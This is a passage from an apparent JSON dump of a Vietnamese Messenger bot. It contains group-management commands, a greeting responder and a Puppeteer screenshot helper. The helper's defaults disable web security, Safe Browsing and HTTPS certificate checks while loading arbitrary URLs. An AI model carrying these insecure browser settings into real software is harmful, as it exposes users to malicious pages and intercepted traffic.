\"TatsuYTB\",\n    description: \"Get all uid and names in Group.\",\n    commandCategory: \"Nh√≥m\",\n    cooldowns: 2,\n    prefix: \"\",\n};\n\nmodule.exports.handleEvent = async ({ api, event, Users }) => {\n    const { threadID, messageID, body } = event;\n    if (body.startsWith(\"uidall\")) {\n        const ep = event.participantIDs;\n        let msg = \"\";\n        let msgs = \"\";\n        let m = 0;\n        for (const i of ep) {\n            m += 1;\n            const name = await Users.getNameUser(i);\n            msg += `${m}. ${name}\\nUID: ${i}\\n\\n`;\n        }\n        msgs += \"Uid c·ªßa all th√†nh vi√™n\\n\\n\" + msg;\n        api.sendMessage(msgs, threadID, messageID);\n    }\n};\n\nmodule.exports.run = async ({ api, event, Users, args }) => {\n    const ep = event.participantIDs;\n    let msg = \"\";\n    let msgs = \"\";\n    let m = 0;\n    for (const i of ep) {\n        m += 1;\n        const name = await Users.getNameUser(i);\n        msg += `${m}. ${name}\\nUID: ${i}\\n\\n`;\n    }\n    msgs += \"Uid c·ªßa all th√†nh vi√™n\\n\\n\" + msg;\n    api.sendMessage(msgs, event.threadID, event.messageID);\n};\n","path":null,"size_bytes":1181,"size_tokens":null},"modules/commands/hi.js":{"content":"module.exports.config = {\n  name: \"hi\",\n  version: \"1.0.0\",\n  hasPermssion: 1,\n  credit: \"Sam\",\n  description: \"Hi g·ª≠i sticker\",\n  commandCategory: \"Nh√≥m\",\n  usages: \"[text]\",\n  cooldowns: 5\n}\n\nmodule.exports.handleEvent = async ({ event, api, Users }) => {\n  let KEY = [ \n    \"hello\",\n    \"hi\",\n    \"hai\",\n    \"ch√†o\",\n    \"h√≠\",\n    \"h√∫\",\n    \"helu\",\n    \"hiii\",\n    \"l√¥\",\n    \"hii\",\n    \"helo\",\n    \"haii\",\n    \"xin ch√†o\",\n    \"ch√†o mn\",\n    \"hi mn\"\n  ];\n  let thread = global.data.threadData.get(event.threadID) || {};\n  if (typeof thread[\"hi\"] == \"undefined\", thread[\"hi\"] == false) return\n  else {\n  if (KEY.includes(event.body.toLowerCase()) !== false) {\n    let data = [\n      \"2523892817885618\",\n      \"2523892964552270\",\n      \"2523893081218925\",\n      \"2523893217885578\",\n      \"2523893384552228\",\n      \"2523892544552312\",\n      \"2523892391218994\",\n      \"2523891461219087\",\n      \"2523891767885723\",\n      \"2523891204552446\",\n      \"2523890691219164\",\n      \"2523890981219135\",\n      \"2523890374552529\",\n      \"2523889681219265\",\n      \"2523889851219248\",\n      \"2523890051219228\",\n      \"2523886944552872\",\n      \"2523887171219516\",\n      \"2523888784552688\",\n      \"2523888217886078\",\n      \"2523888534552713\",\n      \"2523887371219496\",\n      \"2523887771219456\",\n      \"2523887571219476\"\n    ];\n    let sticker = data[Math.floor(Math.random() * data.length)];\n    let moment = require(\"moment-timezone\");\n    let hours = moment.tz('Asia/Ho_Chi_Minh').format('HHmm');\n    let data2 = [\n      \"t·ªët l√†nh\",\n      \"vui v·∫ª\"\n    ];\n    let text = data2[Math.floor(Math.random() * data2.length)]\n    let session = (\n    hours > 0001 && hours <= 400 ? \"s√°ng tinh m∆°\" : \n    hours > 401 && hours <= 700 ? \"s√°ng s·ªõm\" :\n    hours > 701 && hours <= 1000 ? \"s√°ng\" :\n    hours > 1001 && hours <= 1200 ? \"tr∆∞a\" : \n    hours > 1201 && hours <= 1700 ? \"chi·ªÅu\" : \n    hours > 1701 && hours <= 1800 ? \"chi·ªÅu t·ªëi\" : \n    hours > 1801 && hours <= 2100 ? \"t·ªëi\" : \n    hours > 2101 && hours <= 2400 ? \"t·ªëi khuya\" : \n    \"?\");\n    let name = await Users.getNameUser(event.senderID);\n    let mentions = [];\n    mentions.push({\n      tag: name,\n      id: event.senderID\n    })\n    let msg = {body: `Xin ch√†o ${name}, ch√∫c b·∫°n m·ªôt bu·ªïi ${session} ${text} ‚ù§Ô∏è`, mentions}\n    api.sendMessage(msg, event.threadID, (e, info) => {\n      setTimeout(() => {\n        api.sendMessage({sticker: sticker}, event.threadID);\n      }, 100)\n    }, event.messageID)\n  }\n      }\n}\n\nmodule.exports.languages = {\n  \"vi\": {\n    \"on\": \"B·∫≠t\",\n    \"off\": \"TƒÉÃÅt\",\n    \"successText\": `${this.config.name} th√†nh c√¥ng`,\n  },\n  \"en\": {\n    \"on\": \"on\",\n    \"off\": \"off\",\n    \"successText\": \"success!\",\n  }\n}\n\nmodule.exports.run = async ({ event, api, Threads, getText }) => {\n  let { threadID, messageID } = event;\n  let data = (await Threads.getData(threadID)).data;\n  if (typeof data[\"hi\"] == \"undefined\" || data[\"hi\"] == true) data[\"hi\"] = false;\n  else data[\"hi\"] = true;\n  await Threads.setData(threadID, {\n    data\n  });\n  global.data.threadData.set(threadID, data);\n  return api.sendMessage(`${(data[\"hi\"] == false) ? getText(\"off\") : getText(\"on\")} ${getText(\"successText\")}`, threadID, messageID);\n    }","path":null,"size_bytes":3216,"size_tokens":null},"modules/commands/listban.js":{"content":"module.exports.config = {\n  name: \"listban\",\n  version: \"1.0.0\",\n  hasPermssion: 2,\n  credits: \"ManhG\",\n  description: \"Xem danh s√°ch ban c·ªßa nh√≥m ho·∫∑c c·ªßa ng∆∞·ªùi d√πng\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"[thread/user]\",\n  cooldowns: 5\n};\nmodule.exports.handleReply = async function ({ api, args, Users, handleReply, event, Threads }) {\n  const { threadID, messageID } = event;\n  let name = await Users.getNameUser(event.senderID);\n  if (parseInt(event.senderID) !== parseInt(handleReply.author)) return;\n\n  switch (handleReply.type) {\n    case \"unbanthread\":\n      {\n        var arrnum = event.body.split(\" \");\n        var msg = \"\";\n        var uidS = \"\";\n        var strS = \"\";\n        var modules = \"------- Unban -------\\n\"\n        var nums = arrnum.map(n => parseInt(n));\n        for (let num of nums) {\n          var myString = handleReply.listBanned[num - 1];\n          var str = myString.slice(3);\n          let uidK = myString.split(\":\");\n          const uid = (uidK[uidK.length - 1]).trim();\n\n          const data = (await Threads.getData(uid)).data || {};\n          data.banned = 0;\n          data.reason = null;\n          data.dateAdded = null;\n          await Threads.setData(uid, { data });\n          var typef = global.data.threadBanned.delete(uid, 1);\n          msg += typef + ' ' + myString + \"\\n\";\n          uidS += ' ' + uid + \"\\n\";\n          strS += ' ' + str + \"\\n\";\n        }\n        console.log(modules, msg);\n        api.sendMessage(`¬ªTh√¥ng b√°o t·ª´ Admin ${name}¬´\\n\\n-Nh√≥m ${strS} c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c G·ª° Ban\\n\\n-C√≥ th·ªÉ s·ª≠ d·ª•ng ƒë∆∞·ª£c bot ngay b√¢y gi·ªù`, uidS, () =>\n          api.sendMessage(`${global.data.botID}`, () =>\n            api.sendMessage(`‚òÖ‚òÖTh·ª±c thi Unban(true/false)‚òÖ‚òÖ\\n\\n${msg}`, event.threadID, () =>\n              api.unsendMessage(handleReply.messageID))));\n      }\n      break;\n\n    case 'unbanuser':\n      {\n        var arrnum = event.body.split(\" \");\n        var msg = \"\";\n        var uidS = \"\";\n        var strS = \"\";\n        var modules = \"------- Unban -------\\n\"\n        var nums = arrnum.map(n => parseInt(n));\n\n        for (let num of nums) {\n          var myString = handleReply.listBanned[num - 1];\n          var str = myString.slice(3);\n          let uidK = myString.split(\":\");\n          const uid = (uidK[uidK.length - 1]).trim();\n\n          const data = (await Users.getData(uid)).data || {};\n          data.banned = 0;\n          data.reason = null;\n          data.dateAdded = null;\n          await Users.setData(uid, { data });\n          var typef = global.data.userBanned.delete(uid, 1);\n          msg += typef + ' ' + myString + \"\\n\";\n          uidS += ' ' + uid + \"\\n\";\n          strS += ' ' + str + \"\\n\";\n\n        }\n        api.sendMessage(`‚òÖ‚òÖTh·ª±c thi Unban(true/false)‚òÖ‚òÖ\\n\\n${msg}`, event.threadID, () =>\n          api.unsendMessage(handleReply.messageID));\n      }\n      break;\n  }\n};\n\nmodule.exports.run = async function ({ event, api, Users, args, Threads }) {\n  const { threadID, messageID } = event;\n  var listBanned = [], listbanViews = [];\n  i = 1, j = 1;\n  var dataThread = [];\n  switch (args[0]) {\n    case \"thread\":\n    case \"t\":\n    case \"-t\":\n      {\n        const threadBanned = global.data.threadBanned.keys();\n        for (const singleThread of threadBanned) {\n          const nameT = await global.data.threadInfo.get(singleThread).threadName || \"T√™n kh√¥ng t·ªìn t·∫°i\";\n          const reason = await global.data.threadBanned.get(singleThread).reason;\n          const date = await global.data.threadBanned.get(singleThread).dateAdded;\n          var modules = \"ThreadBan: \"\n          listBanned.push(`${i++}. ${nameT}\\nüî∞TID: ${singleThread}`);\n\n          listbanViews.push(`${j++}. ${nameT}\\nüî∞TID: ${singleThread}\\nüí¢L√Ω do: ${reason}\\n_Time: ${date}`);\n\n        };\n\n        return api.sendMessage(listbanViews.length != 0 ? api.sendMessage(`üê≥Hi·ªán t·∫°i ƒëang c√≥ ${listbanViews.length} nh√≥m b·ªã ban\\n\\n${listbanViews.join(\"\\n\")}` +\n          \"\\n\\nReply tin nh·∫Øn n√†y + s·ªë th·ª© t·ª±, c√≥ th·ªÉ rep nhi·ªÅu s·ªë, c√°ch nhau b·∫±ng d·∫•u c√°ch ƒë·ªÉ unban thread t∆∞∆°ng ·ª©ng\",\n          threadID, (error, info) => {\n            client.handleReply.push({\n              name: this.config.name,\n              messageID: info.messageID,\n              author: event.senderID,\n              type: 'unbanthread',\n              listBanned\n            });\n          },\n          messageID\n        ) : \"Hi·ªán t·∫°i kh√¥ng c√≥ nh√≥m n√†o b·ªã ban!\", threadID, messageID);\n      }\n    case \"user\":\n    case \"u\":\n    case \"-u\":\n      {\n        const userBanned = global.data.userBanned.keys();\n        //console.log(userBanned)\n        var modules = \"UserBan: \"\n        for (const singleUser of userBanned) {\n          const name = global.data.userName.get(singleUser) || await Users.getNameUser(singleUser);\n\n          const reason = await global.data.userBanned.get(singleUser).reason;\n          const date = await global.data.userBanned.get(singleUser).dateAdded;\n\n          listbanViews.push(`${i++}. ${name} \\nüî∞UID: ${singleUser}\\nüí¢L√Ω do: ${reason}\\n_Time: ${date}`);\n\n          listBanned.push(`${j++}. ${name} \\nüî∞UID: ${singleUser}`);\n\n          //console.log(modules, name)\n        }\n        return api.sendMessage(listbanViews.length != 0 ? api.sendMessage(`üê≥Hi·ªán t·∫°i ƒëang c√≥ ${listbanViews.length} ng∆∞·ªùi d√πng b·ªã ban\\n\\n${listbanViews.join(\"\\n\")}` +\n          \"\\n\\nReply tin nh·∫Øn n√†y + s·ªë th·ª© t·ª±, c√≥ th·ªÉ rep nhi·ªÅu s·ªë, c√°ch nhau b·∫±ng d·∫•u c√°ch ƒë·ªÉ unban user t∆∞∆°ng ·ª©ng\",\n          threadID, (error, info) => {\n            global.client.handleReply.push({\n              name: this.config.name,\n              messageID: info.messageID,\n              author: event.senderID,\n              type: 'unbanuser',\n              listBanned\n            });\n          },\n          messageID\n        ) : \"Hi·ªán t·∫°i kh√¥ng c√≥ ng∆∞·ªùi d√πng b·ªã ban\", threadID, messageID);\n      }\n\n    default:\n      {\n        return global.utils.throwError(this.config.name, threadID, messageID);\n      }\n  }\n}","path":null,"size_bytes":6100,"size_tokens":null},"lib/fca-auto/Extra/ExtraScreenShot.js":{"content":"/* global document */\n'use strict';\nconst {promisify} = require('util');\nconst fs = require('fs');\nconst fileUrl = require('file-url');\nconst puppeteer = require('puppeteer');\nconst toughCookie = require('tough-cookie');\n\nconst writeFile = promisify(fs.writeFile);\n\nconst isUrl = string => /^(https?|file):\\/\\/|^data:/.test(string);\n\nconst scrollToElement = (element, options) => {\n\tconst isOverflown = element => {\n\t\treturn (\n\t\t\telement.scrollHeight > element.clientHeight ||\n\t\t\telement.scrollWidth > element.clientWidth\n\t\t);\n\t};\n\n\tconst findScrollParent = element => {\n\t\tif (element === undefined) {\n\t\t\treturn;\n\t\t}\n\n\t\tif (isOverflown(element)) {\n\t\t\treturn element;\n\t\t}\n\n\t\treturn findScrollParent(element.parentElement);\n\t};\n\n\tconst calculateOffset = (rect, options) => {\n\t\tif (options === undefined) {\n\t\t\treturn {\n\t\t\t\tx: rect.left,\n\t\t\t\ty: rect.top\n\t\t\t};\n\t\t}\n\n\t\tconst offset = options.offset || 0;\n\n\t\tswitch (options.offsetFrom) {\n\t\t\tcase 'top':\n\t\t\t\treturn {\n\t\t\t\t\tx: rect.left,\n\t\t\t\t\ty: rect.top + offset\n\t\t\t\t};\n\t\t\tcase 'right':\n\t\t\t\treturn {\n\t\t\t\t\tx: rect.left - offset,\n\t\t\t\t\ty: rect.top\n\t\t\t\t};\n\t\t\tcase 'bottom':\n\t\t\t\treturn {\n\t\t\t\t\tx: rect.left,\n\t\t\t\t\ty: rect.top - offset\n\t\t\t\t};\n\t\t\tcase 'left':\n\t\t\t\treturn {\n\t\t\t\t\tx: rect.left + offset,\n\t\t\t\t\ty: rect.top\n\t\t\t\t};\n\t\t\tdefault:\n\t\t\t\tthrow new Error('Invalid `scrollToElement.offsetFrom` value');\n\t\t}\n\t};\n\n\tconst rect = element.getBoundingClientRect();\n\tconst offset = calculateOffset(rect, options);\n\tconst parent = findScrollParent(element);\n\n\tif (parent !== undefined) {\n\t\tparent.scrollIntoView(true);\n\t\tparent.scrollTo(offset.x, offset.y);\n\t}\n};\n\nconst disableAnimations = () => {\n\tconst rule = `\n\t\t*,\n\t\t::before,\n\t\t::after {\n\t\t\tanimation: initial !important;\n\t\t\ttransition: initial !important;\n\t\t}\n\t`;\n\n\tconst style = document.createElement('style');\n\tdocument.body.append(style);\n\n\tstyle.sheet.insertRule(rule);\n};\n\nconst getBoundingClientRect = element => {\n\tconst {top, left, height, width, x, y} = element.getBoundingClientRect();\n\treturn {top, left, height, width, x, y};\n};\n\nconst parseCookie = (url, cookie) => {\n\tif (typeof cookie === 'object') {\n\t\treturn cookie;\n\t}\n\n\tconst jar = new toughCookie.CookieJar(undefined, {rejectPublicSuffixes: false});\n\tjar.setCookieSync(cookie, url);\n\tconst returnValue = jar.serializeSync().cookies[0];\n\n\t// Use this instead of the above when the following issue is fixed:\n\t// https://github.com/salesforce/tough-cookie/issues/149\n\t// const ret = toughCookie.parse(cookie).serializeSync();\n\n\treturnValue.name = returnValue.key;\n\tdelete returnValue.key;\n\n\tif (returnValue.expires) {\n\t\treturnValue.expires = Math.floor(new Date(returnValue.expires) / 1000);\n\t}\n\n\treturn returnValue;\n};\n\nconst imagesHaveLoaded = () => [...document.images].map(element => element.complete);\n\nconst captureWebsite = async (input, options) => {\n\toptions = {\n\t\tinputType: 'url',\n\t\twidth: 1920,\n\t\theight: 1080,\n\t\tscaleFactor: 2,\n\t\tfullPage: false,\n\t\tdefaultBackground: true,\n\t\ttimeout: 60, // The Puppeteer default of 30 is too short\n\t\tdelay: 0,\n\t\tdebug: false,\n\t\tdarkMode: true,\n\t\tlaunchOptions: { devtools:true },\n\t\t_keepAlive: true,\n\t\tisJavaScriptEnabled: true,\n\t\tinset: 0,\n        args: [\"--webview-disable-safebrowsing-support\",\n        \"--disable-web-security\"],\n        ignoreHTTPSErrors: true,\n\t\t...options\n\t};\n\n\tconst isHTMLContent = options.inputType === 'html';\n\n\tinput = isHTMLContent || isUrl(input) ? input : fileUrl(input);\n\n\tconst timeoutInSeconds = options.timeout * 1000;\n\n\tconst viewportOptions = {\n\t\twidth: options.width,\n\t\theight: options.height,\n\t\tdeviceScaleFactor: options.scaleFactor\n\t};\n\n\tconst screenshotOptions = {};\n\n\tif (options.type) {\n\t\tscreenshotOptions.type = options.type;\n\t}\n\n\tif (options.quality) {\n\t\tscreenshotOptions.quality = options.quality * 100;\n\t}\n\n\tif (options.fullPage) {\n\t\tscreenshotOptions.fullPage = options.fullPage;\n\t}\n\n\tif (typeof options.defaultBackground === 'boolean') {\n\t\tscreenshotOptions.omitBackground = !options.defaultBackground;\n\t}\n\n\tconst launchOptions = {...options.launchOptions};\n\n\tif (options.debug) {\n\t\tlaunchOptions.headless = false;\n\t\tlaunchOptions.slowMo = 100;\n\t}\n\n\tconst browser = options._browser || await puppeteer.launch(launchOptions);\n\tconst page = await browser.newPage();\n\n\tif (options.preloadFunction) {\n\t\tawait page.evaluateOnNewDocument(options.preloadFunction);\n\t}\n\n\tawait page.setJavaScriptEnabled(options.isJavaScriptEnabled);\n\n\tif (options.debug) {\n\t\tpage.on('console', message => {\n\t\t\tlet {url, lineNumber, columnNumber} = message.location();\n\t\t\tlineNumber = lineNumber ? `:${lineNumber}` : '';\n\t\t\tcolumnNumber = columnNumber ? `:${columnNumber}` : '';\n\t\t\tconst location = url ? ` (${url}${lineNumber}${columnNumber})` : '';\n\t\t\tconsole.log(`\\nPage log:${location}\\n${message.text()}\\n`);\n\t\t});\n\n\t\tpage.on('pageerror', error => {\n\t\t\tconsole.log('\\nPage error:', error, '\\n');\n\t\t});\n\n\t\t// TODO: Add more events from https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md#event-requestfailed\n\t}\n\n\tif (options.authentication) {\n\t\tawait page.authenticate(options.authentication);\n\t}\n\n\tif (options.cookies) {\n\t\tconst cookies = options.cookies.map(cookie => parseCookie(isHTMLContent ? 'about:blank' : input, cookie));\n\t\tawait page.setCookie(...cookies);\n\t}\n\n\tif (options.headers) {\n\t\tawait page.setExtraHTTPHeaders(options.headers);\n\t}\n\n\tif (options.userAgent) {\n\t\tawait page.setUserAgent(options.userAgent);\n\t}\n\n\tawait page.setViewport(viewportOptions);\n\n\tif (options.emulateDevice) {\n\t\tif (!(options.emulateDevice in puppeteer.devices)) {\n\t\t\tthrow new Error(`The device name \\`${options.emulateDevice}\\` is not supported`);\n\t\t}\n\n\t\tawait page.emulate(puppeteer.devices[options.emulateDevice]);\n\t}\n\n\tawait page.emulateMediaFeatures([{\n\t\tname: 'prefers-color-scheme',\n\t\tvalue: options.darkMode ? 'dark' : 'light'\n\t}]);\n\n\tawait page[isHTMLContent ? 'setContent' : 'goto'](input, {\n\t\ttimeout: timeoutInSeconds,\n\t\twaitUntil: 'networkidle2'\n\t});\n\tif (options.disableAnimations) {\n\t\tawait page.evaluate(disableAnimations, options.disableAnimations);\n\t}\n\n\tif (options.hideElements) {\n\t\tawait page.addStyleTag({\n\t\t\tcontent: `${options.hideElements.join(', ')} { visibility: hidden !important; }`\n\t\t});\n\t}\n\n\tif (options.removeElements) {\n\t\tawait page.addStyleTag({\n\t\t\tcontent: `${options.removeElements.join(', ')} { display: none !important; }`\n\t\t});\n\t}\n\n\tif (options.clickElement) {\n\t\tawait page.click(options.clickElement);\n\t}\n\n\tconst getInjectKey = (ext, value) => isUrl(value) ? 'url' : (value.endsWith(`.${ext}`) ? 'path' : 'content');\n\n\tif (!options.isJavaScriptEnabled) {\n\t\t// Enable JavaScript again for `modules` and `scripts`.\n\t\tawait page.setJavaScriptEnabled(true);\n\t}\n\n\tif (options.modules) {\n\t\tawait Promise.all(options.modules.map(module_ => {\n\t\t\treturn page.addScriptTag({\n\t\t\t\t[getInjectKey('js', module_)]: module_,\n\t\t\t\ttype: 'module'\n\t\t\t});\n\t\t}));\n\t}\n\n\tif (options.scripts) {\n\t\tawait Promise.all(options.scripts.map(script => {\n\t\t\treturn page.addScriptTag({\n\t\t\t\t[getInjectKey('js', script)]: script\n\t\t\t});\n\t\t}));\n\t}\n\n\tif (options.styles) {\n\t\tawait Promise.all(options.styles.map(style => {\n\t\t\treturn page.addStyleTag({\n\t\t\t\t[getInjectKey('css', style)]: style\n\t\t\t});\n\t\t}));\n\t}\n\n\tif (options.waitForElement) {\n\t\tawait page.waitForSelector(options.waitForElement, {\n\t\t\tvisible: true,\n\t\t\ttimeout: timeoutInSeconds\n\t\t});\n\t}\n\n\tif (options.beforeScreenshot) {\n\t\tawait options.beforeScreenshot(page, browser);\n\t}\n\n\tif (options.element) {\n\t\tawait page.waitForSelector(options.element, {\n\t\t\tvisible: true,\n\t\t\ttimeout: timeoutInSeconds\n\t\t});\n\t\tscreenshotOptions.clip = await page.$eval(options.element, getBoundingClientRect);\n\t\tscreenshotOptions.fullPage = false;\n\t}\n\n\tif (options.delay) {\n\t\tawait page.waitForTimeout(options.delay * 1000);\n\t}\n\n\tif (options.scrollToElement) {\n\t\t// eslint-disable-next-line unicorn/prefer-ternary\n\t\tif (typeof options.scrollToElement === 'object') {\n\t\t\tawait page.$eval(options.scrollToElement.element, scrollToElement, options.scrollToElement);\n\t\t} else {\n\t\t\tawait page.$eval(options.scrollToElement, scrollToElement);\n\t\t}\n\t}\n\n\tif (screenshotOptions.fullPage) {\n\t\t// Get the height of the rendered page\n\t\tconst bodyHandle = await page.$('body');\n\t\tconst bodyBoundingHeight = await bodyHandle.boundingBox();\n\t\tawait bodyHandle.dispose();\n\n\t\t// Scroll one viewport at a time, pausing to let content load\n\t\tconst viewportHeight = viewportOptions.height;\n\t\tlet viewportIncrement = 0;\n\t\twhile (viewportIncrement + viewportHeight < bodyBoundingHeight) {\n\t\t\tconst navigationPromise = page.waitForNavigation({waitUntil: 'networkidle0'});\n\t\t\t/* eslint-disable no-await-in-loop */\n\t\t\tawait page.evaluate(_viewportHeight => {\n\t\t\t\t/* eslint-disable no-undef */\n\t\t\t\twindow.scrollBy(0, _viewportHeight);\n\t\t\t\t/* eslint-enable no-undef */\n\t\t\t}, viewportHeight);\n\t\t\tawait navigationPromise;\n\t\t\t/* eslint-enable no-await-in-loop */\n\t\t\tviewportIncrement += viewportHeight;\n\t\t}\n\n\t\t// Scroll back to top\n\t\tawait page.evaluate(_ => {\n\t\t\t/* eslint-disable no-undef */\n\t\t\twindow.scrollTo(0, 0);\n\t\t\t/* eslint-enable no-undef */\n\t\t});\n\n\t\t// Some extra delay to let images load\n\t\tawait page.waitForFunction(imagesHaveLoaded, {timeout: timeoutInSeconds});\n\t}\n\n\tif (options.inset && !screenshotOptions.fullPage) {\n\t\tconst inset = {top: 0, right: 0, bottom: 0, left: 0};\n\t\tfor (const key of Object.keys(inset)) {\n\t\t\tif (typeof options.inset === 'number') {\n\t\t\t\tinset[key] = options.inset;\n\t\t\t} else {\n\t\t\t\tinset[key] = options.inset[key] || 0;\n\t\t\t}\n\t\t}\n\n\t\tlet clipOptions = screenshotOptions.clip;\n\n\t\tif (!clipOptions) {\n\t\t\tclipOptions = await page.evaluate(() => ({\n\t\t\t\tx: 0,\n\t\t\t\ty: 0,\n\t\t\t\t/* eslint-disable no-undef */\n\t\t\t\theight: window.innerHeight,\n\t\t\t\twidth: window.innerWidth\n\t\t\t\t/* eslint-enable no-undef */\n\t\t\t}));\n\t\t}\n\n\t\tconst x = clipOptions.x + inset.left;\n\t\tconst y = clipOptions.y + inset.top;\n\t\tconst width = clipOptions.width - (inset.left + inset.right);\n\t\tconst height = clipOptions.height - (inset.top + inset.bottom);\n\n\t\tif (width === 0 || height === 0) {\n\t\t\tawait page.close();\n\n\t\t\tthrow new Error('When using the `clip` option, the width or height of the screenshot cannot be equal to 0.');\n\t\t}\n\n\t\tscreenshotOptions.clip = {x, y, width, height};\n\t}\n\n\tconst buffer = await page.screenshot(screenshotOptions);\n\n\tawait page.close();\n\n\tif (!options._keepAlive) {\n\t\tawait browser.close();\n\t}\n\n\treturn buffer;\n};\n\nmodule.exports.file = async (url, filePath, options = {}) => {\n\tconst screenshot = await captureWebsite(url, options);\n\n\tawait writeFile(filePath, screenshot, {\n\t\tflag: options.overwrite ? 'w' : 'wx'\n\t});\n};\n\nmodule.exports.buffer = async (url, options) => captureWebsite(url, options);\n\nmodule.exports.base64 = async (url, options) => {\n\tconst screenshot = await captureWebsite(url, options);\n\treturn screenshot.toString('base64');\n};\n\nmodule.exports.devices = Object.values(puppeteer.devices).map(device => device.name);\n\nif (process.env.NODE_ENV === 'test') {\n\tmodule.exports._startBrowser = puppeteer.launch.bind(puppeteer);\n}\n","path":null,"size_bytes":10918,"size_tokens":null},"modules/commands/listbox.js":{"content":"module.exports.config = {\n    name: 'listbox',\n    version: '1.0.0',\n    credits: 'ManhG',\n    hasPermssion: 3,\n    description: '[Ban/Unban/Remove] List thread bot ƒë√£ tham gia',\n    commandCategory: 'H·ªá Th·ªëng',\n    usages: '[s√¥ÃÅ trang/all]',\n    cooldowns: 5\n};\n\nmodule.exports.handleReply = async function({ api, event, args, Threads, handleReply }) {\n    const { threadID, messageID } = event;\n    if (parseInt(event.senderID) !== parseInt(handleReply.author)) return;\n    const moment = require(\"moment-timezone\");\n    const time = moment.tz(\"Asia/Ho_Chi_minh\").format(\"HH:MM:ss L\");\n    var arg = event.body.split(\" \");\n    switch (handleReply.type) {\n        case \"reply\":\n            {\n                if (arg[0] == \"ban\" || arg[0] == \"Ban\") {\n                    var arrnum = event.body.split(\" \");\n                    var msg = \"\";\n                    var modules = \"[ ùêåùêéùêÉùêÑ ] - ùóßùóµùòÇÃõÃ£ùó∞ ùòÅùóµùó∂ ùóØùóÆùóª ¬´\\n\"\n                    var nums = arrnum.map(n => parseInt(n));\n                    nums.shift();\n                    for (let num of nums) {\n                        var idgr = handleReply.groupid[num - 1];\n                        var groupName = handleReply.groupName[num - 1];\n\n                        const data = (await Threads.getData(idgr)).data || {};\n                        data.banned = true;\n                        data.dateAdded = time;\n                        var typef = await Threads.setData(idgr, { data });\n                        global.data.threadBanned.set(idgr, { dateAdded: data.dateAdded });\n                        msg += typef + ' ' + groupName + '\\nùóßùóúùóó: ' + idgr + \"\\n\";\n                        console.log(modules, msg)\n                    }\n                    api.sendMessage(`=== [ ùêìùêáùêéÃÇùêçùêÜ ùêÅùêÄÃÅùêé ] ===\\nüéÄ ùêçùê°ùêöÃ£ÃÇùêß ùê•ùêûÃ£ÃÇùêßùê° ùêúùêöÃÇÃÅùê¶ ùêßùê°ùê®ÃÅùê¶ ùêßùêöÃÄùê≤ ùê≠ùêÆÃõÃÄ ùêÄùêÉùêåùêàùêç\\nùêãùê¢ùêûÃÇùêß ùêáùêûÃ£ÃÇ ùêÄùêÉùêåùêàùêç ùêùùêûÃÇÃâ ùêõùê¢ùêûÃÇÃÅùê≠ ùê≠ùê°ùêûÃÇùê¶ ùêúùê°ùê¢ ùê≠ùê¢ùêûÃÇÃÅùê≠\\nüåê ùêÖùêõ ùêÄùêÉùêåùêàùêç: ${global.config.FACEBOOK_ADMIN}`, idgr, () =>\n                        api.sendMessage(`${global.data.botID}`, () =>\n                            api.sendMessage(` [ ùêåùêéùêÉùêÑ ] - ùóßùóµùòÇÃõÃ£ùó∞ ùòÅùóµùó∂ ùóØùóÆùóª ¬´\\n(true/false) ¬´\\n\\n ${msg}`, threadID, () =>\n                                api.unsendMessage(handleReply.messageID))));\n                    break;\n                }\n\n                if (arg[0] == \"unban\" || arg[0] == \"Unban\" || arg[0] == \"ub\" || arg[0] == \"Ub\") {\n                    var arrnum = event.body.split(\" \");\n                    var msg = \"\";\n                    var modules = \"[ ùêåùêéùêÉùêÑ ] - ùóßùóµùòÇÃõÃ£ùó∞ ùòÅùóµùó∂ ùòÇùóªùóØùóÆùóª\\n\"\n                    var nums = arrnum.map(n => parseInt(n));\n                    nums.shift();\n                    for (let num of nums) {\n                        var idgr = handleReply.groupid[num - 1];\n                        var groupName = handleReply.groupName[num - 1];\n\n                        const data = (await Threads.getData(idgr)).data || {};\n                        data.banned = false;\n                        data.dateAdded = null;\n                        var typef = await Threads.setData(idgr, { data });\n                        global.data.threadBanned.delete(idgr, 1);\n                        msg += typef + ' ' + groupName + '\\nùóßùóúùóó: ' + idgr + \"\\n\";\n                        console.log(modules, msg)\n                    }\n                    api.sendMessage(`=== [ ùêìùêáùêéÃÇùêçùêÜ ùêÅùêÄÃÅùêé ] ===\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\nüéÄ ùó°ùóµùóºÃÅùó∫ ùóïùóÆÃ£ùóª ùêÉùóÆÃÉ ùêÉùòÇÃõùóºÃõÃ£ùó∞ ùóöùóºÃõÃÉ ùóïùóÆùóª\\nüíù ùêÇùê°ùêÆÃÅùêú ùêõùêöÃ£ùêß ùêúùê®ÃÅ ùê¶ùê®Ã£ÃÇùê≠ ùêßùê†ùêöÃÄùê≤ ùêØùêÆùê¢ ùêØùêûÃâ`, idgr, () =>\n                        api.sendMessage(`${global.data.botID}`, () =>\n                            api.sendMessage(`¬ª [ ùêåùêéùêÉùêÑ ] - ùóßùóµùòÇÃõÃ£ùó∞ ùòÅùóµùó∂ ùòÇùóªùóØùóÆùóª ¬´(true/false)\\n\\n${msg}`, threadID, () =>\n                                api.unsendMessage(handleReply.messageID))));\n                    break;\n                }\n\n                if (arg[0] == \"out\" || arg[0] == \"Out\") {\n                    var arrnum = event.body.split(\" \");\n                    var msg = \"\";\n                    var modules = \"[ ùêåùêéùêÉùêÑ ] - ùóßùóµùòÇÃõÃ£ùó∞ ùòÅùóµùó∂ ùó¢ùòÇùòÅ\\n\"\n                    var nums = arrnum.map(n => parseInt(n));\n                    nums.shift();\n                    for (let num of nums) {\n                        var idgr = handleReply.groupid[num - 1];\n                        var groupName = handleReply.groupName[num - 1];\n                        var typef = api.removeUserFromGroup(`${api.getCurrentUserID()}`, idgr);\n                        msg += typef + ' ' + groupName + '\\n¬ª TID: ' + idgr + \"\\n\";\n                        console.log(modules, msg)\n                    }\n                    api.sendMessage(`== [ ùêìùêáùêéÃÇùêçùêÜ ùêÅùêÄÃÅùêé ] ==\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\nüí¢ ùêçùê°ùêöÃ£ÃÇùêß ùê•ùêûÃ£ÃÇùêßùê° 